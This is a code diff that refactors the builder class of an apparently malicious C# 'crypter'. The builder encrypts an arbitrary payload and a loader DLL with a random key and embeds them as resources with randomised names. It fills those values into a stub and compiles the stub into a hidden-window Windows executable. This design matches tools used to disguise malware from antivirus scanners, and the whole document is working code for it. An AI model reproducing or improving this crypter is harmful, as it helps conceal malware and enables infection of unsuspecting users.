@@ -25,40 +25,37 @@ namespace Crypt
 #else
             _loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
 #endif
+
+            PopulateGeneratedOptions();
         }
 
         public bool Build()
+        {
+            byte[] loaderBinary = File.ReadAllBytes(_loaderPath);
+            byte[] encPayload = Encryption.Encrypt(_options.encryptionType, _options.encryptionKey, _payload);
+            byte[] encLoader = Encryption.Encrypt(_options.encryptionType, _options.encryptionKey, loaderBinary);
+
+            string stubSrc = AddOptionsToStub(Properties.Resources.Stub);
+
+            string resourceDir = CreateResource(encPayload, encLoader);
+            CompilerParameters compParams = GenerateCompilerParams(resourceDir);
+
+            bool result = Compile(stubSrc, compParams);
+
+            File.Delete(resourceDir);
+
+            return result;
+        }
+
+        private void PopulateGeneratedOptions()
         {
             _options.encryptionKey = Encryption.GenerateKey();
             _options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
             _options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
             _options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);
-
-            Byte[] encPayload = Encrypt(_payload);
-            Byte[] encLoader = Encrypt(File.ReadAllBytes(_loaderPath));
-            string stubSrc = AddInfo(Properties.Resources.Stub);
-
-            bool result = Compile(encPayload, encLoader, stubSrc);
-            return result;
         }
 
-        private byte[] Encrypt(Byte[] input)
-        {
-            Byte[] encryptedPL;
-            switch (_options.encryptionType)
-            {
-                case EncryptionType.Rijndael:
-                    encryptedPL = Encryption.RijndaelEncrypt(input, _options.encryptionKey);
-                    break;
-                default:
-                    encryptedPL = Encryption.Xor(input, _options.encryptionKey);
-                    break;
-            }
-
-            return encryptedPL;
-        }
-
-        private string AddInfo(string stubSrc)
+        private string AddOptionsToStub(string stubSrc)
         {
             string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(_options.encryptionKey));
             newStub = newStub.Replace("[resFileName]", _options.resFileName);
@@ -81,8 +78,7 @@ namespace Crypt
             return resourceDir;
         }
 
-        //TODO: fix this mess of a method
-        private bool Compile(byte[] encPayload, byte[] encLoader, string stubSrc)
+        private CompilerParameters GenerateCompilerParams(string resourceDir)
         {
             CompilerParameters compParams = new CompilerParameters();
             compParams.GenerateExecutable = true;
@@ -91,16 +87,17 @@ namespace Crypt
             compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";
 
             compParams.ReferencedAssemblies.Add("System.dll");
-
-            string resourceDir = CreateResource(encPayload, encLoader);
             compParams.EmbeddedResources.Add(resourceDir);
 
+            return compParams;
+        }
+
+        private bool Compile(string stubSrc, CompilerParameters compParams)
+        {
             Dictionary<string, string> providerOptions = new Dictionary<string, string>();
             providerOptions.Add("CompilerVersion", "v2.0");
 
             CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);
-
-            File.Delete(resourceDir);
 
             return !compResults.Errors.HasErrors;
         }
